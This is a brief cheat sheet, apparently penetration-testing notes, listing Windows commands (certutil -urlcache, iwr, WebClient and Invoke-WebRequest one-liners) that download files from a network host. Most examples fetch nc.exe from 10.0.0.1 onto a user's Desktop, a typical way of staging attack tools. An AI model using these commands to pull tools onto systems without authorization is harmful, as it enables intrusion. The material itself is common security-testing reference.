# Download a file - Windows CLI

## [Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

```powershell
# Can work in cmd.exe
certutil -f -urlcache http://10.0.0.1:80/nc.exe nc.exe

```

## [iwr](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5)

```powershell
# only for powershell
iwr -uri http://$ip/file.txt -Outfile file.txt
```



## [PowershellSecript](https://learn.microsoft.com/en-us/training/modules/script-with-powershell/)

<pre class="language-powershell"><code class="lang-powershell">powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1:80/nc.exe', 'C:\Users\root\Desktop\nc.exe')"
<strong>
</strong><strong>powershell -c "Invoke-WebRequest http://10.0.0.1:80/nc.exe -OutFile C:\Users\root\Desktop\nc.exe"
</strong></code></pre>
